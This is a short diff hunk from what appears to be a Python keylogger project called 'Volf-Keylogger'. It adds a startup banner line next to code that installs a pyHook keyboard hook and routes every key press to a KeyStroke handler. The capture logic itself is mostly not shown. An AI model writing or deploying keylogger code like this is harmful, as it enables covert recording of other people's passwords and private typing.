@@ -60,6 +60,7 @@ def KeyStroke(event):
 
     return True
 
+print "Started Volf-Keylogger\n===================================\n"
 kl = pyHook.HookManager()
 kl.KeyDown = KeyStroke
 
